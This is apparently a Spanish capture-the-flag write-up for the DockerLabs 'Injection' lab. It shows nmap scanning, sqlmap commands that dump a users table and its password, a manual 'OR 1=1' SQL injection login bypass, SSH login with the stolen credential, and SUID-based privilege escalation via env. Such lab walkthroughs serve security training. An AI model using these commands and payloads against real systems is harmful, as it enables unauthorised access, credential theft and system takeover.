plataforma: https://dockerlabs.es/#/<br>
Mirror: https://mega.nz/file/wLN2nQ7B#p0YzUFAsrE3ilnJ9HzMr1hfsUq2DPYiDHlIU_9IEizU<br>
Nombre: Injection<br>
Dificultad: muy fácil<br>
Creador: El pingüino de Mario<br>
Herramientas:
 - Ping
 - NMAP
 - WhatWeb
 - SQLMAP
 - Puerto 22 SSH - SFTP



Cacptura Máquina:
![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20Machine.png)

Deploy:

```sh fold:"Deploy injection machine"
sudo bash autodeploy.sh injection.tar
```


Ping para comprobar conectividad y ver el ttl: 64
![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20Ping.png)

Reconocimiento
```sh fold:"Reconocimiento con nmap"
sudo nmap -sS -p- -sC -sV -Pn 172.17.0.2
```

Puertos abiertos:
![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20Nmap.png)

Nos encontramos los puertos 
- 22
- 80
Primero investigamos el puerto 80
Web:
![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20Web.png)

WhatWeb no nos da mucha información

![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20Whatweb.png)

Intento varios Usuarios y contraseñas pero conm ninguno acccedo, en todos me da el mensaje:
Wrong Credentials

Vamos a ver algo más sobre eta web


Vamos a ver si con SqlMap podemos sacar algo:

```sh fold:"Sql map"
sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
# information_schema
# mysql
# performance_schema
# regyster
# sys
sqlmap -u http://172.17.0.2/index.php --forms -D --tables --batch
# [1 table]
# +-------+
# | users |
# +-------+
sqlmap -u http://172.17.0.2/index.php --forms -D -T users --columns --batch
# +----------+-------------+
# | Column   | Type        |
# +----------+-------------+
# | passwd   | varchar(30) |
# | username | varchar(30) |
# +----------+-------------+
sqlmap -u http://172.17.0.2/index.php --forms -D -T users -C passwd,username --dump --batch
# +------------------+----------+
# | passwd           | username |
# +------------------+----------+
# | KJSDFG789FGSDF78 | dylan    |
# +------------------+----------+

```
Otra forma de hacer el Sql Injection:
![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20SQL%20Injection%20manual.png)

Explicacion:
Ahora bien, suponiendo que la consulta que busca un usuario en la base de datos es la siguiente:

```sql
SELECT * FROM usuarios WHERE username = 'admin' AND password = 'password';
```

Si insertamos la inyección SQL (`admin' OR 1=1 -- -`) en donde está el texto "admin", la consulta quedará de esta manera:

```sql
SELECT * FROM usuarios WHERE username = 'admin' OR 1=1 -- - AND password = 'password';
```
Esto es posible porque los parámetros de la consulta no están validados:
![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20Codigo%20consulta%20sin%20validar.png)


Acceso con usuario dylan:

![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20User%20access.png)

Vamos a intentar entrar por SSH con este usuario y esta contraseña:

Acceso por ssh con el usuario dylan:

![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20SSH%20dylan%20user.png)


## Escalada de privilegios
sudo -l
![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20sudo-l.png)

find / -perm -4000 2>/dev/null

![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20Suid.png)

Buscamos en Gtfobins algunos de estos suid
![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20gtfobbins%20env.png)
Encuentro env:
lo ejecutamos con las rutas absolutas


![image](https://github.com/borazuwarah/CTFs-ByBorazuwarah/blob/main/CTFs-By%20borazuwarah/DockerLabs/Injection/Images/DockerLabs%20-%20Injection%20-%20Escalada%20de%20privilegiso.png)]

DockerLabs - Injection -
